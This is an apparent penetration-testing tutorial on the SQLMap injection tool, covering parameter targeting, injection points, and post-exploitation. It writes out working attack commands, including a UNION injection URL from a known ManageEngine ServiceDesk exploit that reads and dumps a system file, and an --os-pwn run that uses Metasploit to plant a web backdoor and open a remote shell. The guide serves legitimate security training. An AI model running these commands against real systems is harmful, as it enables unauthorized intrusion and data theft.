# SQLMap SQL Injection Tool
This module will cover the basics on using the SQL injection automation tool, [SQLMap](http://sqlmap.org/). This tool automates the SQL injection process once a vulnerability is found and can also often discover unknown SQL vulnerabilities in web applications.
## Vulnerability Discovery
This section will cover most of the vulnerability discovery methods that I have used during the penetration tests.
### Be Specific
The more specific we are to SQLMap the faster and more efficient it becomes. For instance, if we were to use the browser to test for a vulnerability manually and we see the error output specify that it is from a [MySQL](https://www.mysql.com/) service, we can then specify it to SQLMap to further attempt to exploit the discovered vulnerability as so,

`sqlmap -u http://x.x.x.x:x/?id=1 --dbms=mysql`

### Specifying Exact Parameter to Attack
This is more of a efficiency/optimization of the attack in which SQLMap can avoid looking for SQL injection vulnerabilities in parameters that we already know not to have them. Top specify which paramter to use, we use the `-p (PARAMETER NAME)` argument. For example, The URI, `http://x.x.x.x:x/files.do?fileName=file.txt&color=red&id=123`, has three HTTP GET parameters, `fileName`, `color`, and `id`. If we replaced the `id` parameter in the browser and noticed the DOM output had chnaged, we can test JUST this parameter with the `-p (PARAMETER NAME)` as,

`sqlmap -p id -u http://x.x.x.x:x/files.do?fileName=file.txt&color=red&id=123`

### Specifying Exact Injection Point
SQLMap provides a way to specify exactly where to attempt SQL injection. This can be very useful when building SQL injection exploits upon other, known, exploits for vulnerabilities.To do so, we use an asterisk, `*` in the URL provided to SQLmap as so,

`root@kali:/payloads# sqlmap --level=5 --risk=3 -p woID --dbms=mysql -u 'http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO&woID=WorkOrder.WORKORDERID*=6)union%20select%201,2,3,4,5,6,7,8,load_file(%22c:\\boot.ini%22),10,11,12,13,14,15,16,17,18,19,1%20into%20dumpfile%27C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\images\\boot.ini.txt%27/' `

This example was taken from the already known exploit, [ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection](https://www.exploit-db.com/exploits/11793/), and builds upon it by allowing SQLMap to inject other commands that do not include file content disclosure.

## Post Exploitation
This section will cover queries commonly performed during the Post Exploitation phase of the pnetration test of a database / web service/app. 
### OS-PWN
SQLMap has the ability to utilize the MetaSploit Framework in attempt to take remote control of the target system with a spawned shell. For this to work, we need to first know a few things,
1. A writeable directory on the target system
2. What (web) programming language does the system support
3. Where our Metasploit Framework is installed on our system

Here is an exmaple of using the `--os-pwn` function in SQLMap:

`root@wt:~# sqlmap -p id -u http://x.x.x.x:x/foo.do?id=45 --msf-path=/pwnt/exploitation/metasploit-framework/ --dbms=mysql --random-agent`

The output from SQLMap would be something similar to,

```
[08:06:06] [INFO] testing MySQL
[08:06:06] [INFO] confirming MySQL
[08:06:06] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL < 5.0.0
[08:06:06] [INFO] fingerprinting the back-end DBMS operating system
[08:06:06] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
> 1
[08:06:09] [INFO] going to use a web backdoor to establish the tunnel
which web application language does the web server support?
[1] ASP (default)
[2] ASPX
[3] JSP
[4] PHP
> 3
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] n
[08:06:13] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 2
please provide a comma separate list of absolute directory paths: C:\WINDOWS\Temp
```

Where you can see that I have specified the writeable directory on the target server, the programming language used by the vulnerabile web application, and to use the Metasploit Framework tunnel.

### OS-Shell
SQLMap has the ability to spawn remote shells on some vulnerable systems with a couple pieces of information:
1. A writeable directory on the target system
2. What (web) programming language does the system support
We perform this type of attack simply by using the `--os-shell` argument to SQLMap.

### Database Information Gathering
Most of the options for database discovery are pretty straight forward. Some steps to gathering the most of the database information would commonly be,
1. Get the Databse version
2. Get the current user of the web application / database queries
3. Get the database name
4. Get the tables in the database
5. Get the data (records) from these tables.
